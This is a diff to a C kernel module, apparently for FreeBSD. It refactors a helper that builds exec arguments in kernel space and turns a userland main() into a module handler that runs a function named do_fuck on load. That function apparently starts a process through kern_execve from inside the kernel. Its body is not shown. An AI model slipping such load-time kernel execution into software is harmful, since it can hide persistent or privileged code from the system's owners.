@@ -40,49 +40,49 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 
 
 
-    static void do_fuck(void);
 
-    static int custom_copin_args_for_exec(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv) {
-        u_long arg, env;
-        int error;
-    
-        bzero(args, sizeof(*args));
-        if (argv == NULL) {
-            return (EFAULT);
+
+static int custom_copin_args_for_exec(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv) {
+    u_long arg, env;
+    int error;
+
+    bzero(args, sizeof(*args));
+    if (argv == NULL) {
+        return (EFAULT);
+    }
+
+    /*
+        * Allocate demand-paged memory for the file name, argument, and
+        * environment strings.
+        */
+    error = exec_alloc_args(args);
+    if (error != 0) {
+        return (error);
+    }
+
+    /*
+        * Copy the file name.
+        */
+    error = exec_args_add_fname(args, fname, segflg);
+    if (error != 0) {
+        printf("error at line %d\n", __LINE__);
+        return error;
+    }
+    /*
+        * extract arguments first
+        */
+    for (;;) {
+        arg = (u_long)*argv++;
+        if (arg == 0) {
+            break;
         }
-    
-        /*
-         * Allocate demand-paged memory for the file name, argument, and
-         * environment strings.
-         */
-        error = exec_alloc_args(args);
-        if (error != 0) {
-            return (error);
-        }
-    
-        /*
-         * Copy the file name.
-         */
-        error = exec_args_add_fname(args, fname, segflg);
+        error = exec_args_add_arg(args, (char *)(uintptr_t)arg,
+            UIO_SYSSPACE);
         if (error != 0) {
             printf("error at line %d\n", __LINE__);
-            return error;
+            break;
         }
-        /*
-         * extract arguments first
-         */
-        for (;;) {
-            arg = (u_long)*argv++;
-            if (arg == 0) {
-                break;
-            }
-            error = exec_args_add_arg(args, (char *)(uintptr_t)arg,
-              UIO_SYSSPACE);
-            if (error != 0) {
-                printf("error at line %d\n", __LINE__);
-                break;
-            }
-        }
+    }
 
     /*
      * extract environment strings
@@ -127,10 +127,28 @@ static void do_fuck(void) {
 
 }
 
-int main(void) {
-    do_fuck();
-    return 0;
+static int event_handler(struct module *module, int event, void *arg) {
+    switch (event) {
+        case MOD_LOAD:
+            do_fuck();
+            return 0;
+        case MOD_UNLOAD:
+            printf("[LKM] Module unloaded.\n");
+            return 0;
+        default:
+            return EOPNOTSUPP;
+    }
 }
+
+
+static moduledata_t module_data = {
+    "kms",
+    event_handler,
+    NULL
+};
+
+
+DECLARE_MODULE(kms_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 
 
 
